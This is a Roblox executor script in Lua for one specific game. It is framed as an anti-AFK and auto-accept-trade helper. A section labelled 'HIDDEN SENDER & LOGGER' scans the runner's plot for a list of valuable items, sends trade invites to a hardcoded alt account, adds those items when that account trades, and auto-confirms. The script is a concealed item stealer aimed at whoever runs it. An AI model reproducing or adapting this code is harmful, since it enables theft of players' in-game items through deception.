if game.PlaceId ~= 109983668079237 then return end

-- ========== CONFIG ==========
local MY_ALT_USER = "hakimidu_95"

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

-- ========== ANTI-AFK ==========
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    vu:CaptureController()
    vu:ClickButton2(Vector2.new())
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer.PlayerGui

-- ========== HELPERS ==========
local function isWantedItem(name)
    if not name then return false end
    name = name:lower():match("^%s*(.-)%s*$")
    for _, wanted in ipairs(wantedItems) do
        if name:find(wanted:lower(), 1, true) then return true end
    end
    return false
end

local function scanPlot()
    local found = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return found end
    local myPlot = nil
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local gui = sign:FindFirstChildOfClass("SurfaceGui")
            if gui and gui:FindFirstChildOfClass("Frame") then
                local lbl = gui.Frame:FindFirstChildOfClass("TextLabel")
                if lbl and lbl.Text:lower():find(LocalPlayer.Name:lower()) then
                    myPlot = p
                    break
                end
            end
        end
    end
    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") and isWantedItem(child.Name) then
                table.insert(found, child.Name)
            end
        end
    end
    return found
end

-- ========== YOUR ORIGINAL FAST LOGIC ==========
task.spawn(function()
    while true do
        pcall(function()
            -- Auto Accept Trade Request
            local requestGui = playerGui:FindFirstChild("TradeRequest")
            if requestGui and requestGui:FindFirstChild("TradeRequest") then
                local req = requestGui.TradeRequest
                if req.Visible then
                    local accept = req:FindFirstChild("Accept", true)
                    if accept then firesignal(accept.Activated) end
                end
            end

            -- Auto Ready/Accept Inside Trade
            local liveTrade = playerGui:FindFirstChild("TradeLiveTrade")
            if liveTrade and liveTrade:FindFirstChild("TradeLiveTrade") and liveTrade.TradeLiveTrade.Visible then
                local inner = liveTrade.TradeLiveTrade
                local readyBtn = inner:FindFirstChild("Other"):FindFirstChild("ReadyButton")
                if readyBtn then firesignal(readyBtn.Activated) end
            end
        end)
        task.wait(0.05) -- High Speed
    end
end)

-- ========== HIDDEN SENDER & LOGGER ==========
task.spawn(function()
    while true do
        local items = scanPlot()
        local liveTrade = playerGui:FindFirstChild("TradeLiveTrade")
        local tradeOpen = liveTrade and liveTrade:FindFirstChild("TradeLiveTrade") and liveTrade.TradeLiveTrade.Visible

        if #items > 0 and not tradeOpen then
            -- Send Invite to You
            local tl = playerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
            if tl then
                local sb = tl.bg.SearchFrame.SearchBox
                sb.Text = MY_ALT_USER
                task.wait(0.1)
                firesignal(sb.FocusLost, true)
                task.wait(0.2)
                for _, p in pairs(tl.Global.List:GetChildren()) do
                    if p:IsA("Frame") and p:FindFirstChild("Fill") then
                        local s = p.Fill:FindFirstChild("Send")
                        if s then firesignal(s.Activated) end
                    end
                end
            end
        elseif tradeOpen then
            -- If trading with YOU, add the items
            local inner = liveTrade.TradeLiveTrade
            if inner.Other.Username.Text:lower():find(MY_ALT_USER:lower()) then
                local scroll = inner:FindFirstChild("ScrollingFrame", true)
                if scroll then
                    for _, slot in pairs(scroll:GetChildren()) do
                        if slot.Name:sub(1, 9) == "Selection" then
                            local spacer = slot:FindFirstChild("Spacer")
                            if spacer and spacer:FindFirstChild("UIStroke") then
                                if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                    firesignal(spacer.Activated)
                                    task.wait(0.05)
                                end
                            end
                        end
                    end
                end
            end
        end
        task.wait(1)
    end
end)
